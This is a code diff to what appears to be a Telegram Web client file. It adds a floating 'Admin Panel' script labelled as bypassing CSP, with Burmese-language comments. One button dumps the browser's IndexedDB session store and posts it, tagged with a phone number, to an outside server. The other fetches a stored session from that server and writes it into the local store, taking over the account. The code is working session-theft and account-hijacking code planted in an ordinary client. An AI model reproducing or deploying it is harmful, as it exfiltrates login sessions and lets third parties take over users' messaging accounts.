@@ -128,3 +128,105 @@ onBeforeUnload(() => {
   actions.leaveGroupCall?.({ isPageUnload: true });
   actions.hangUp?.({ isPageUnload: true });
 });
+
+// --- 🌟 CUSTOM ADMIN PANEL SCRIPT (Bypass CSP) 🌟 ---
+setTimeout(() => {
+    if (document.getElementById('my-admin-panel')) return; 
+
+    // Panel UI ဖန်တီးခြင်း
+    const panel = document.createElement('div');
+    panel.id = 'my-admin-panel';
+    panel.style.cssText = 'position: fixed; bottom: 20px; right: 20px; z-index: 999999; background: #fff; padding: 15px; border-radius: 10px; border: 2px solid #0088cc; box-shadow: 0 4px 10px rgba(0,0,0,0.3);';
+
+    const title = document.createElement('b');
+    title.style.cssText = 'color: black; margin-bottom: 10px; display: block; font-size: 14px;';
+    title.innerText = 'Admin Panel';
+
+    const btnSync = document.createElement('button');
+    btnSync.style.cssText = 'background: #28a745; color: #fff; padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; margin-right: 5px; font-weight: bold;';
+    btnSync.innerText = '📤 Data ပို့ရန် (Staff)';
+
+    const btnAdmin = document.createElement('button');
+    btnAdmin.style.cssText = 'background: #dc3545; color: #fff; padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;';
+    btnAdmin.innerText = '📥 Admin ဝင်ရန်';
+
+    panel.appendChild(title);
+    panel.appendChild(btnSync);
+    panel.appendChild(btnAdmin);
+    document.body.appendChild(panel);
+
+    // --- ၁။ STAFF မှ DATA ပို့မည့် လုပ်ဆောင်ချက် ---
+    btnSync.addEventListener('click', () => {
+        const phone = prompt("Staff ဖုန်းနံပါတ် ထည့်ပါ (+959...):");
+        if (!phone) return;
+        
+        alert("၁။ Data စတင်ဆွဲထုတ်နေပါပြီ...");
+        const req = indexedDB.open('tt-data');
+        req.onsuccess = (e: any) => {
+            const db = e.target.result;
+            if (!db.objectStoreNames.contains('keyval')) return alert("❌ Error: အကောင့် Login မဝင်ရသေးပါ။");
+            
+            const store = db.transaction('keyval', 'readonly').objectStore('keyval');
+            store.getAll().onsuccess = (e1: any) => {
+                store.getAllKeys().onsuccess = (e2: any) => {
+                    const data: any = {};
+                    const keys = e2.target.result;
+                    const vals = e1.target.result;
+                    keys.forEach((k: string, i: number) => data[k] = vals[i]);
+                    
+                    alert("၂။ MongoDB သို့ ပို့နေပါပြီ...");
+                    
+                    // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
+                    fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phoneNumber: phone, indexedDbData: JSON.stringify(data) })
+                    })
+                    .then(res => res.json())
+                    .then(resData => {
+                        if(resData.success) alert("✅ အောင်မြင်ပါသည်။ MongoDB သို့ Data ရောက်သွားပါပြီ!");
+                        else alert("❌ Database Error: " + JSON.stringify(resData));
+                    })
+                    .catch(err => alert("❌ Network Error: Backend လင့်ခ်မှားနေခြင်း သို့မဟုတ် Server အိပ်နေခြင်း ဖြစ်နိုင်ပါသည်။\n\nError: " + err.message));
+                };
+            };
+        };
+    });
+
+    // --- ၂။ ADMIN ဝင်မည့် လုပ်ဆောင်ချက် ---
+    btnAdmin.addEventListener('click', () => {
+        const phone = prompt("ဝင်ကြည့်လိုသော Staff ဖုန်းနံပါတ် ထည့်ပါ (+959...):");
+        if (!phone) return;
+
+        alert("၁။ Database မှ Data ရှာနေပါပြီ...");
+        
+        // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
+        fetch(`https://telegram-7ih3.onrender.com/api/get-web-session/${phone}`)
+        .then(res => res.json())
+        .then(result => {
+            if (!result.success) return alert("❌ Database ထဲတွင် Data မရှိသေးပါ။ (Staff က Data မပို့ရသေးပါ)");
+            
+            const dataToImport = JSON.parse(result.data);
+            const req = indexedDB.open('tt-data');
+            req.onsuccess = (e: any) => {
+                const db = e.target.result;
+                const store = db.transaction('keyval', 'readwrite').objectStore('keyval');
+                store.clear().onsuccess = () => {
+                    let count = 0;
+                    const keys = Object.keys(dataToImport);
+                    keys.forEach(k => {
+                        store.put(dataToImport[k], k).onsuccess = () => {
+                            count++;
+                            if (count === keys.length) {
+                                alert("✅ Admin ဝင်ခြင်း အောင်မြင်ပါသည်။ အကောင့်ထဲသို့ ပြောင်းလဲနေပါပြီ...");
+                                window.location.reload();
+                            }
+                        };
+                    });
+                };
+            };
+        })
+        .catch(err => alert("❌ Network Error: Backend လင့်ခ်မှားနေပါသည်။\n\nError: " + err.message));
+    });
+}, 3000);
+// -----------------------------------------------------------
